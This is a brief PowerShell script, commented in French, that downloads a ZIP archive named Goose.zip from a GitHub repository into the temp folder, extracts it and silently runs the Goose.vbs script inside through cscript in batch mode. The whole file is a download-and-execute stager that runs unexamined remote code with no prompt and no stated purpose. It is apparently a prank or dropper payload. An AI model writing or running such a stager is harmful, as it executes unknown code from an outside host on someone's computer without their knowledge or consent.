# Chemin temporaire pour stocker le fichier ZIP
$tempZipPath = "$env:TEMP\Goose.zip"
$tempExtractPath = "$env:TEMP\Goose"

# Téléchargement du fichier ZIP depuis l'URL
Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath

# Extraction du fichier ZIP
Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath

# Chemin du fichier VBS à exécuter
$vbsFilePath = "$tempExtractPath\Goose.vbs"

# Vérifier si le fichier VBS existe
if (Test-Path $vbsFilePath) {
    # Exécution du fichier VBS
    cscript.exe //B //Nologo $vbsFilePath
} else {
    Write-Host "Le fichier Goose.vbs n'a pas été trouvé."
}